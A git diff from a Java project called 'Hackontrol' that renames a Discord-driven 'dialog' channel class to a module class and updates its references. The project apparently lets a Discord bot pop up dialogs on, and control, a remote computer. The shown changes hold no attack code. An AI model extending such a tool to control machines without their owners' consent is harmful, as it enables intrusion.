@@ -1,9 +1,8 @@
-package com.khopan.hackontrol.channel;
+package com.khopan.hackontrol.module;
 
 import java.util.List;
 import java.util.function.Consumer;
 
-import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -24,8 +23,8 @@ import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 
-public class DialogChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "dialog";
+public class DialogModule extends Module {
+	private static final String MODULE_NAME = "dialog";
 
 	private static int ThreadCount;
 
@@ -33,17 +32,17 @@ public class DialogChannel extends HackontrolChannel {
 
 	@Override
 	public String getName() {
-		return DialogChannel.CHANNEL_NAME;
+		return DialogModule.MODULE_NAME;
 	}
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, DialogChannel.BUTTON_NEW_DIALOG, context -> this.replyDialogModal(context, false, null));
+		registry.register(InteractionManager.BUTTON_REGISTRY, DialogModule.BUTTON_NEW_DIALOG, context -> this.replyDialogModal(context, false, null));
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(DialogChannel.BUTTON_NEW_DIALOG)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(DialogModule.BUTTON_NEW_DIALOG)).queue();
 	}
 
 	private void replyDialogModal(IModalCallback callback, boolean edit, DialogInstance instance) {
@@ -140,10 +139,10 @@ public class DialogChannel extends HackontrolChannel {
 			};
 
 			context.getChannel().sendMessage("**Button: " + buttonName + "**").addActionRow(HackontrolButton.delete()).queue();
-			DialogChannel.ThreadCount--;
+			DialogModule.ThreadCount--;
 		});
 
-		thread.setName("Hackontrol Dialog Thread #" + (++DialogChannel.ThreadCount));
+		thread.setName("Hackontrol Dialog Thread #" + (++DialogModule.ThreadCount));
 		thread.start();
 	}
 
